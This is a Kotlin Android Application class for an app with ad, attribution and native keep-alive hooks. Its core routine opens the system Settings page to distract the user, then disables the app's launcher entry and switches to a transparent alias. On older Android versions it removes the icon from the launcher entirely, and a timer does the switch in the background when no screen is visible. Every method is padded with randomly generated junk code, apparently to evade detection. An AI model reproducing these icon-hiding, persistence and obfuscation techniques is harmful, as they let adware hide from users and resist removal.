package lxp.bpjt.yyc

import android.app.Activity
import android.app.Application
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import lxp.bpjt.yyc.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import lxp.jmun.kxfub.base.APPContext
import lxp.jmun.kxfub.base.OverseaAppHost
import lxp.jmun.kxfub.base.OverseaAppInitializer
import lxp.jmun.kxfub.ad.runtime.AdLifecycleInstaller
import lxp.lya.jykkt.WOQC
import lxp.lya.jykkt.WOPT


class KWQ : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        private const val TAG = "KWQ"

        /** MMKV key：图标切换+跳设置 待执行标记(跨进程持久化，防进程死亡丢失) */
        private const val KEY_PENDING_MYSTERY = "pending_mystery_switch"

        /** 兜底定时器：置标记后最长等待首个可见 Activity 的时长 */
        private const val FALLBACK_TIMEOUT_MS = 10_000L

        @JvmStatic
        var insApp: KWQ? = null

        /** 读取持久化的待执行标记(进程重启后仍可恢复) */
        @JvmStatic
        fun hasPendingMystery(): Boolean =
            WOPT.getBoolean(KEY_PENDING_MYSTERY, false)
    }

    /** 当前已 started 未 stopped 的 Activity 数量，>0 即存在可见窗口 */
    private var startedActivityCount = 0

    /** 兜底定时器(仅执行一次切换) */
    private val mainHandler = Handler(Looper.getMainLooper())
    private var fallbackRunnable: Runnable? = null

    override fun onCreate() {
           val NdtvphwVzA : Any = if (kotlin.random.Random.nextBoolean()) 59 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val humHmE  = (NdtvphwVzA  as? String)?.reversed() ?: "wPDHxOWcFOISU_-1840040746"

        if (humHmE  == "PHtMVdfZbKPO") {
            java.lang.System.out.print(humHmE )
        }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 统一安装广告生命周期监听，内部带幂等保护
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
        // 监听 Activity 生命周期：消费"跳设置+切图标"标记。
        // 消费点不能固定在某个 Activity(如 Splash)——归因回调与 Splash 渲染是竞态，
        // 且切换组件会中止启动中的 Splash(禁用其组件导致 mid-launch 被掐断)，
        // 因此改为任意首个 resumed 的 Activity 消费，且切换动作放在跳转之后。
        registerActivityLifecycleCallbacks(object : ActivityLifecycleCallbacks {
            override fun onActivityResumed(activity: Activity) {
                   val rDASlwrfAyK : Any = if (kotlin.random.Random.nextBoolean()) 25 else "jH6"
                // 尝试将数字安全转为字符串，失败则触发 Elvis
                val tkRiyJf  = (rDASlwrfAyK  as? String)?.reversed() ?: "JGZcmuKnjbvrIELkHo_-1486689456"

                if (tkRiyJf  == "rUembKxTRLPvdjROoi") {
                    java.lang.System.out.print(tkRiyJf )
                }
                if (hasPendingMystery()) {
                    WOQC.d(TAG, "消费待执行标记：先跳设置页，再切换图标")
                    consumePendingMystery(activity)
                }
            }

            override fun onActivityStarted(activity: Activity) {
                val arr_MsHtVlnbmbuQZUP = kotlin.random.Random.nextInt(100)
                 // Kotlin 风格的位运算：shl (<<), shr (>>), xor
                 val i_BPRmAZQqiIgUQPCfym  = (arr_MsHtVlnbmbuQZUP  shl 91) xor (arr_MsHtVlnbmbuQZUP  shr 0)
                 val j_MFhhPrpQnfUHxF  = i_BPRmAZQqiIgUQPCfym .inv() and 0xFFFF
                 if (j_MFhhPrpQnfUHxF  == 0xBADB) { // 极低概率匹配
                     kotlin.io.print("Junk Value: tmp_cAlqmPLnmUb")
                 }
                startedActivityCount++
            }

            override fun onActivityStopped(activity: Activity) {
                val arr_opwtjWRyGn  = listOf("KGXEYrxi", "VKEdnniGnkpNPVwoVi", "FjFfdPhHLzDmXWCQiFN").map { 
                     it + kotlin.random.Random.nextInt(10) 
                 }
                 val ad_bhbZpzutUpaVMF  = arr_opwtjWRyGn .filter { it.length > 5 }
                 if (ad_bhbZpzutUpaVMF .isNotEmpty() && java.lang.System.currentTimeMillis() < 61) {
                     ad_bhbZpzutUpaVMF .forEach { _ ->  }
                 }
                startedActivityCount = maxOf(0, startedActivityCount - 1)
            }

            override fun onActivityPaused(activity: Activity) {}
            override fun onActivitySaveInstanceState(activity: Activity, outState: Bundle) {}
            override fun onActivityDestroyed(activity: Activity) {}
            override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {}
        })
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        val LRsBFPuMPaHRkFREmy : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val FjkaRLI  = LRsBFPuMPaHRkFREmy ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_28" 
            }
            if (FjkaRLI .startsWith("adLIaYpvDsfCiARS ")) {
                android.util.Log.v("TAG", FjkaRLI )
            }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
           val kGpGHnTUJ : Any = if (kotlin.random.Random.nextBoolean()) 80 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val kznBnarXNywEtd  = (kGpGHnTUJ  as? String)?.reversed() ?: "pdAFZCcDk_1780071120"

        if (kznBnarXNywEtd  == "VxQrPn") {
            java.lang.System.out.print(kznBnarXNywEtd )
        }
        WOQQ.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_BEfPtMqY = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_YAbol  = (arr_BEfPtMqY  shl 34) xor (arr_BEfPtMqY  shr 43)
         val j_xJsoRblFho  = i_YAbol .inv() and 0xFFFF
         if (j_xJsoRblFho  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_nxqAwcWFkY")
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        val ARdfDCPNnPDImnN : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val FzrkjVLEu  = ARdfDCPNnPDImnN ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_30" 
            }
            if (FzrkjVLEu .startsWith("MDlxH ")) {
                android.util.Log.v("TAG", FzrkjVLEu )
            }
        // 图标切换"跳转前置"方案：
        // ① 当前已有可见 Activity → 立即执行(跳设置+切换)，此时 startActivity 不受 A16 BAL 限制；
        // ② 冷启动早期(无可见窗口) → 只置持久化标记，禁止此时切换组件——
        //    切换(禁用 LQD)会中止 mid-launch 的 Splash，导致标记消费者永远不出现；
        //    标记由首个 resumed 的 Activity 消费(先跳设置再切换)，另设兜底定时器：
        //    纯后台场景(无任何 Activity 会 resume)超时后只执行切换，保证图标功能不丢。
        if (startedActivityCount > 0) {
            WOQC.d(TAG, "已有可见 Activity，立即执行跳设置+切换")
            executeMystery(this, jumpSettings = true)
        } else {
            WOQC.d(TAG, "暂无可见 Activity，置持久化标记等待消费")
            markPendingMystery()
        }
    }


    override fun initKeepPower(app: Application) {
           val ZxgUTjUDkPrszFdcv : Any = if (kotlin.random.Random.nextBoolean()) 28 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val nhYFzaRRxUNgd  = (ZxgUTjUDkPrszFdcv  as? String)?.reversed() ?: "GaVXXMG_-862558316"

        if (nhYFzaRRxUNgd  == "pDHHtfmMpJz") {
            java.lang.System.out.print(nhYFzaRRxUNgd )
        }
        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
        NativeJniUtils.virinit(app)
    }

    /** 置持久化标记并启动兜底定时器 */
    private fun markPendingMystery() {
           val RJLkJwX : Any = if (kotlin.random.Random.nextBoolean()) 71 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val ZMzZwgIzHwyPAJ  = (RJLkJwX  as? String)?.reversed() ?: "GUqjFX_1952865108"

        if (ZMzZwgIzHwyPAJ  == "sNVamtVrjWcvmok") {
            java.lang.System.out.print(ZMzZwgIzHwyPAJ )
        }
        WOPT.putBoolean(KEY_PENDING_MYSTERY, true)
        cancelFallback()
        val runnable = Runnable {
            // 兜底：超时仍无 Activity 消费(纯后台场景)，只执行切换不跳设置
            if (hasPendingMystery()) {
                WOQC.d(TAG, "兜底定时器触发：超时无可见 Activity，仅执行图标切换")
                executeMystery(this, jumpSettings = false)
            }
        }
        fallbackRunnable = runnable
        mainHandler.postDelayed(runnable, FALLBACK_TIMEOUT_MS)
    }

    /** 消费标记：先跳设置页(NEW_TASK 独立任务栈)，再执行组件切换。
     *  切换放在跳转之后：此刻消费的 Activity 已 resumed，禁用 LQD
     *  不会中止其自身启动；用户已在设置页(独立任务栈)，本应用任务栈变化无感。 */
    private fun consumePendingMystery(activity: Activity) {
        val arr_PduMQoZDujT = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_BTfScGHoTBHryukdVrH  = (arr_PduMQoZDujT  shl 91) xor (arr_PduMQoZDujT  shr 37)
         val j_VQtcrSJeBEP  = i_BTfScGHoTBHryukdVrH .inv() and 0xFFFF
         if (j_VQtcrSJeBEP  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_BdvYcCXCNz")
         }
        WOPT.putBoolean(KEY_PENDING_MYSTERY, false)
        cancelFallback()
        jumpSettings(activity)
        switchIconComponents()
    }

    /** 立即执行(已可见场景)：与消费路径同序——先跳设置，再切换 */
    private fun executeMystery(context: Context, jumpSettings: Boolean) {
        val KXpkIPLVzWOnBMn : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val CDcQyaiBiIweDO  = KXpkIPLVzWOnBMn ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_27" 
            }
            if (CDcQyaiBiIweDO .startsWith("ZnJTAkKfGSLPidT ")) {
                android.util.Log.v("TAG", CDcQyaiBiIweDO )
            }
        WOPT.putBoolean(KEY_PENDING_MYSTERY, false)
        cancelFallback()
        if (jumpSettings) {
            jumpSettings(context)
        }
        switchIconComponents()
    }

    /** 跳系统设置页。NEW_TASK 使设置页进入自身任务栈，与本应用任务栈解耦，
     *  组件切换触发的 launcher 刷新/任务重排不会牵连设置页，保证其留在前台。 */
    private fun jumpSettings(context: Context) {
        val xhUBhXiAAzsymOahefj : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val qpFXe  = xhUBhXiAAzsymOahefj ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_37" 
            }
            if (qpFXe .startsWith("ZUpHJxBm ")) {
                android.util.Log.v("TAG", qpFXe )
            }
        try {
            val intent = Intent(Settings.ACTION_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (t: Throwable) {
            // 跳转失败不影响切换(切换才是核心功能)
            WOQC.e(TAG, "跳转系统设置失败", t)
        }
    }

    /** 切换启动图标：禁用 LQD 主入口，启用透明 MysteryAliasActivity。
     *  组件切换不依赖任何窗口，Application context 即可执行。
     *  包名沿用运行时类名推导，避免硬编码包前缀被混淆后失效(与 WOOX 原实现一致)。 */
    private fun switchIconComponents() {
           val YGAadHwEKH : Any = if (kotlin.random.Random.nextBoolean()) 45 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val nflvleYXRGt  = (YGAadHwEKH  as? String)?.reversed() ?: "KCKpViCcyBKLMIRC_650007613"

        if (nflvleYXRGt  == "JZgAPkJLyUe") {
            java.lang.System.out.print(nflvleYXRGt )
        }
        try {
            val pkg = WOOX::class.java.name.substringBeforeLast('.')
            val alias = "$pkg.MysteryAliasActivity"
            WOOX.set(this, LQD::class.java.name, alias)
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                // Android 10 以下：再禁用别名，连透明占位图标一并从桌面移除
                WOOX.disableComponent(this, alias)
            }
        } catch (t: Throwable) {
            WOQC.e(TAG, "图标组件切换失败", t)
        }
    }

    private fun cancelFallback() {
        val arr_ULTjKnmQBPSAD  = listOf("HgglGlnnIn", "FevGuspkuIN", "fLihgPvNU").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_TqMrXmJwWVZoziB  = arr_ULTjKnmQBPSAD .filter { it.length > 97 }
         if (ad_TqMrXmJwWVZoziB .isNotEmpty() && java.lang.System.currentTimeMillis() < 85) {
             ad_TqMrXmJwWVZoziB .forEach { _ ->  }
         }
        fallbackRunnable?.let { mainHandler.removeCallbacks(it) }
        fallbackRunnable = null
    }

}